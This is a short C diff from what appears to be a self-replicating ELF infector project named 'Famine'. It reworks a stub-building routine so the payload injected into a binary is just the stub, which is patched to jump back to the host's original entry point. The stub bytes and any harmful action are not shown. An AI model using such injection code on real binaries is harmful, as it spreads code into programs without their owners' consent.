@@ -2,16 +2,12 @@
 
 // Build the injected stub in its own buffer and patch it for this binary.
 // Class-independent: the caller passes the assembled stub bytes (the 64-bit or
-// the 32-bit stub) via `stub`/`stub_len`. Layout: [stub][compressed blob].
-// Values unknown at assembly time are marker placeholders overwritten here:
-//   - the 4 decode constants via patch_all (delta = payload_va - seg_vaddr,
-//     blob offset, compressed length, original length);
-//   - JMP_MKR, replaced with the rel32 displacement of the return jump to the
-//     original entry point.
-// Marker searches stay within the stub bytes; the blob is never patched.
-bool build_stub(t_packer *p, const unsigned char *stub, size_t stub_len)
+// the 32-bit stub) via `stub`/`stub_len`. The payload is just the stub.
+// The only value unknown at assembly time is JMP_MKR, replaced here with the
+// rel32 displacement of the return jump to the original entry point.
+bool build_stub(t_famine *p, const unsigned char *stub, size_t stub_len)
 {
-    p->payload_size = stub_len + p->blob_size;
+    p->payload_size = stub_len;
     p->payload      = ft_calloc(1, p->payload_size);
     if(!p->payload)
     {
@@ -19,10 +15,8 @@ bool build_stub(t_packer *p, const unsigned char *stub, size_t stub_len)
         return false;
     }
 
-    // Copy the assembled stub, then append the compressed blob after it.
+    // Copy the assembled stub.
     ft_memcpy(p->payload, stub, stub_len);
-    if(p->blob)
-        ft_memcpy(p->payload + stub_len, p->blob, p->blob_size);
 
     // Locate the JMP_MKR placeholder (the jmp's rel32 displacement).
     size_t  disp_offset = 0;
